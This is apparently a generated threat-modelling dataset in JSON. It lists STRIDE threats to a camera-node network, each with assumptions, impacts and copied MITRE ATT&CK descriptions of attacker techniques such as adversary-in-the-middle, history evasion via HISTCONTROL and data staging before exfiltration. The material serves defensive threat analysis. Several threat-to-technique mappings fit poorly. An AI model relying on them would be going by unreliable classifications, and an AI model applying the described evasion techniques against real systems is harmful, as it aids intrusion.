                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could manipulate system scripts or binaries to gain higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "Scripts and binaries are not protected with proper permissions.",
                    "Role": "System Administrator",
                    "Condition": "During system setup and maintenance."
                },
                {
                    "Assumption": "Attackers have access to modify these files.",
                    "Role": "System User",
                    "Condition": "When file access controls are weak or compromised."
                }
            ],
            "Potential Impact": "Gain administrative control over system components.",
            "MITRE ATT&CK Keywords": [
                "script manipulation",
                "binary modification",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "28",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof a legitimate camera node to inject malicious data into the network.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has network access.",
                    "Role": "Attacker",
                    "Condition": "Valid if the network is not well-segmented."
                },
                {
                    "Assumption": "Weak authentication mechanisms.",
                    "Role": "System Architect",
                    "Condition": "True if authentication is not enforced properly."
                },
                {
                    "Assumption": "Lack of MAC filtering.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if MAC addresses are not whitelisted."
                }
            ],
            "Potential Impact": "Unauthorized disclosure, data tampering, disruption of service.",
            "MITRE ATT&CK Keywords": [
                "network",
                "spoofing",
                "injection",
                "device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Impersonation of a command and control server by an attacker.",
            "Assumptions": [
                {
                    "Assumption": "Attackers know the C2 server details.",
                    "Role": "Attacker",
                    "Condition": "True if C2 details are leaked or poorly secured."
                },
                {
                    "Assumption": "Weak encryption methods.",
                    "Role": "Developer",
                    "Condition": "Valid if C2 communication uses outdated encryption."
                },
                {
                    "Assumption": "No proper verification.",
                    "Role": "System Admin",
                    "Condition": "Exists if server identity verification is not implemented."
                }
            ],
            "Potential Impact": "Data tampering and unauthorized command execution.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "command",
                "control"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attacker spoofing identity to access sensitive visual data.",
            "Assumptions": [
                {
                    "Assumption": "Access control weaknesses.",
                    "Role": "Security Engineer",
                    "Condition": "True if access controls are not strict."
                },
                {
                    "Assumption": "Credential reuse.",
                    "Role": "User",
                    "Condition": "Valid if users reuse passwords across systems."
                },
                {
                    "Assumption": "Insecure transmission.",
                    "Role": "Network Engineer",
                    "Condition": "Exists if data is transmitted without proper encryption."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive information.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "identity",
                "data",
                "access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attacker intercepts and alters visual data in transit.",
            "Assumptions": [
                {
                    "Assumption": "Unencrypted transmission.",
                    "Role": "Network Engineer",
                    "Condition": "Valid if communication is not encrypted."
                },
                {
                    "Assumption": "Network access.",
                    "Role": "Attacker",
                    "Condition": "True if attacker can access the network layer."
                },
                {
                    "Assumption": "No integrity check.",
                    "Role": "Developer",
                    "Condition": "Exists if data integrity checks are missing during transmission."
                }
            ],
            "Potential Impact": "Data integrity compromised and potential misinformation.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "intercept",
                "data",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Modification of firmware on camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "Physical access to devices.",
                    "Role": "Attacker",
                    "Condition": "Valid if devices are not physically secured."
                },
                {
                    "Assumption": "Weak firmware update mechanisms.",
                    "Role": "System Architect",
                    "Condition": "True if firmware updates are not signed."
                },
                {
                    "Assumption": "Insufficient monitoring.",
                    "Role": "Security Team",
                    "Condition": "Exists if real-time monitoring is inadequate."
                }
            ],
            "Potential Impact": "Compromise of device functionality and data accuracy.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "device",
                "hardware"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious software updates distributed by an attacker.",
            "Assumptions": [
                {
                    "Assumption": "Update channel compromise.",
                    "Role": "Attacker",
                    "Condition": "True if update channels are insecure."
                },
                {
                    "Assumption": "Users lack verification steps.",
                    "Role": "User",
                    "Condition": "Valid if users do not verify update authenticity."
                },
                {
                    "Assumption": "Lack of encryption.",
                    "Role": "Developer",
                    "Condition": "Exists if updates are undigitally signed."
                }
            ],
            "Potential Impact": "System takeover and data manipulation.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "software",
                "update",
                "distribution"
            ],
            "mitre_technique": {
                "name": "Compromise Software Dependencies and Development Tools",
                "description": "Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. ",
                "id": "attack-pattern--191cc6af-1bb2-4344-ab5f-28e496638720",
                "technique_id": "T1195.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny uploading or modifying sensitive visual data.",
            "Assumptions": [
                {
                    "Assumption": "No non-repudiation mechanisms.",
                    "Role": "System Designer",
                    "Condition": "True if system lacks audit logs."
                },
                {
                    "Assumption": "Shared credentials.",
                    "Role": "User",
                    "Condition": "Valid if credentials are shared among users."
                },
                {
                    "Assumption": "Weak authentication logs.",
                    "Role": "System Administrator",
                    "Condition": "Exists if authentication logs are not robust."
                }
            ],
            "Potential Impact": "Disputed activities leading to potential data misuse.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "audit",
                "log",
                "data"
            ],
            "mitre_technique": {
                "name": "Archive via Utility",
                "description": "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage)",
                "id": "attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662",
                "technique_id": "T1560.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Tampered log files to obscure malicious activities.",
            "Assumptions": [
                {
                    "Assumption": "Writable log files.",
                    "Role": "System Administrator",
                    "Condition": "True if logs can be modified by users."
                },
                {
                    "Assumption": "Insufficient monitoring.",
                    "Role": "Security Analyst",
                    "Condition": "Valid if there is no real-time log monitoring."
                },
                {
                    "Assumption": "No backup logs.",
                    "Role": "System Architect",
                    "Condition": "Exists if backup mechanisms for logs are missing."
                }
            ],
            "Potential Impact": "Concealing malicious activities and hindering forensic analysis.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log",
                "tamper",
                "audit"
            ],
            "mitre_technique": {
                "name": "HISTCONTROL",
                "description": "The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.",
                "id": "attack-pattern--086952c4-5b90-4185-b573-02bad8e11953",
                "technique_id": "T1148"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Denial of sent commands due to absence of logs.",
            "Assumptions": [
                {
                    "Assumption": "No command logging.",
                    "Role": "System Architect",
                    "Condition": "True if command logging is not implemented."
                },
                {
                    "Assumption": "Weak authentication logs.",
                    "Role": "Developer",
                    "Condition": "Valid if login actions are not verified and logged efficiently."
                },
                {
                    "Assumption": "No user action tracking.",
                    "Role": "Admin",
                    "Condition": "Exists if user actions are not properly tracked."
                }
            ],
            "Potential Impact": "Conflict in action attribution, leading to potential system abuse.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "command",
                "dispute"
            ],
            "mitre_technique": {
                "name": "HISTCONTROL",
                "description": "The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.",
                "id": "attack-pattern--086952c4-5b90-4185-b573-02bad8e11953",
                "technique_id": "T1148"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to nearby visual data due to weak encryption.",
            "Assumptions": [
                {
                    "Assumption": "Use of outdated encryption methods.",
                    "Role": "Developer",
                    "Condition": "True if system uses legacy encryption protocols."
                },
                {
                    "Assumption": "Compromised keys.",
                    "Role": "Attacker",
                    "Condition": "Valid if encryption keys are exposed or weak."
                },
                {
                    "Assumption": "Network access.",
                    "Role": "Attacker",
                    "Condition": "Exists if the attacker has access to the network."
                }
            ],
            "Potential Impact": "Confidentiality breach of visual data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "encryption",
                "data",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized query of sensitive data through side-channel attacks.",
            "Assumptions": [
                {
                    "Assumption": "Side-channel vulnerability.",
                    "Role": "System Designer",
                    "Condition": "True if side-channel defenses are inadequate."
                },
                {
                    "Assumption": "Proximity to device.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker can access the vicinity of devices."
                },
                {
                    "Assumption": "Insufficient monitoring.",
                    "Role": "Security Analyst",
                    "Condition": "Exists if there's no anomaly detection."
                }
            ],
            "Potential Impact": "Confidential data extraction without direct access.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "side-channel",
                "data",
                "extraction"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Exposure of visual contents via unsecured APIs.",
            "Assumptions": [
                {
                    "Assumption": "APIs not secured.",
                    "Role": "Developer",
                    "Condition": "True if API lacks authentication and encryption."
                },
                {
                    "Assumption": "Sensitive data via API.",
                    "Role": "System Architect",
                    "Condition": "Valid if APIs are used to access sensitive data."
                },
                {
                    "Assumption": "Insufficient access control.",
                    "Role": "Security Engineer",
                    "Condition": "Exists if access controls for APIs are weak."
                }
            ],
            "Potential Impact": "Exposure of sensitive visual information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "api",
                "data",
                "exposure"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Flooding camera nodes with requests to disrupt service.",
            "Assumptions": [
                {
                    "Assumption": "Lack of request rate limiting.",
                    "Role": "System Architect",
                    "Condition": "True if there is no rate limiting in place."
                },
                {
                    "Assumption": "Accessible network.",
                    "Role": "Attacker",
                    "Condition": "Valid if attacker can send requests to network."
                },
                {
                    "Assumption": "Insufficient redundancy.",
                    "Role": "Developer",
                    "Condition": "Exists if there is no failover mechanism."
                }
            ],
            "Potential Impact": "Disruption in data availability and monitoring.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network",
                "request",
                "flooding"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
